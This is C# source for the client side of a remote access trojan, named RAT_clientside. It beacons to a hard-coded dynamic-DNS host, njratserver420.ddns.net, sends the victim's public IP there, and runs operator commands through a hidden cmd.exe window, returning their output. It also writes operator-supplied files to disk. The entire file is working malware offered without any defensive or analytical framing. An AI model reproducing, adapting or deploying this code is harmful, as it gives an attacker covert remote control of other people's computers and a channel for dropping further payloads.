using System;
using System.Data;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Net;

namespace RAT_clientside
{
    class Program
    {
        private static string HostName = "njratserver420.ddns.net";
        private static int Port = 6258;

        private static StreamReader sr;
        private static StreamWriter sw;

        private static TcpClient client;

        private static bool ConnectedToServer()
        {
            try
            {
                TcpClient connectedToServerTcpClient = new TcpClient(HostName,6258);
                connectedToServerTcpClient.Dispose();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool KeepAlive = true;

        private static string cmd;
        private static string output;

        public static void Main(string[] args)
        {
            while (KeepAlive)
            {
                try
                {
                    client = new TcpClient(HostName, Port);

                    sw = new StreamWriter(client.GetStream());
                    sr = new StreamReader(client.GetStream());

                    try
                    {
                        sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
                        sw.Flush();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    } //Send the ip of the client

                    while (ConnectedToServer())
                    {
                        try
                        {
                            cmd = sr.ReadLine();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        } //Get the Command

                        if (cmd.StartsWith("E+"))
                        {
                            string exeCmd = cmd.Substring(2);
                            Console.WriteLine("E");

                            Process cmdProcess = new Process();
                            cmdProcess.StartInfo.CreateNoWindow = true;
                            cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            cmdProcess.StartInfo.UseShellExecute = false;
                            cmdProcess.StartInfo.RedirectStandardOutput = true;
                            cmdProcess.StartInfo.FileName = "cmd.exe";

                            cmdProcess.StartInfo.Arguments = "/C" + exeCmd;
                            cmdProcess.Start();

                            output = cmdProcess.StandardOutput.ReadToEnd();

                            Console.WriteLine(output);

                            exeCmd = string.Empty;
                            cmd = string.Empty;
                            //Execute command and send back output
                        }

                        if (cmd.StartsWith("S"))
                        {
                            string[] sendArgs = cmd.Split(Convert.ToChar("_"));

                            string fileName = sendArgs[1];
                            string dataString = sendArgs[2];

                            byte[] data = dataString
                                .Split(Convert.ToChar("+"))
                                .Select(item => byte.Parse(item))
                                .ToArray();

                            File.WriteAllBytes(fileName, data);

                            output = fileName;
                        }

                        if (cmd.StartsWith("killAll"))
                        {
                            Console.WriteLine("killAll");
                            KeepAlive = false;
                        }

                        try
                        {
                            sw.WriteLine(output);
                            sw.Flush();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }

                        output = string.Empty;

                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                } //Try to connect to the server

            }
        }
    }

}